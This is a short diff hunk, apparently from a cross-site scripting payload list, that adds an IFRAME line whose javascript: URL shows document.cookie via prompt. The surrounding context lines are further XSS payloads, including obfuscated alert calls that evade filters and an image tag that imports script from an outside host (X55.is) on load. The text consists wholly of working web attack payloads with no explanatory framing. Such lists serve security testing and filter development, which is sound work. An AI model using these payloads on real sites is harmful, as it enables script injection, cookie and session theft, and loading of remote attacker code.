@@ -107,6 +107,7 @@ javascript:%ef%bb%bfalert(XSS)
 <SCRIPT>location=%27javasCript:alert\x281\x29%27</SCRIPT>
 ';k='e'%0Atop['al'+k+'rt'](1)//
 "';k='e'%0Atop['al'+k+'rt'](1)//"
+<IFRAME SRC="javascript:prompt(document.cookie);"></iframe>
 <Img Src=//X55.is OnLoad%0C=import(Src)>
 <img/src/onerror=alert/1337/(1)>
 <img/src/onerror=alert//&NewLine;(2)>
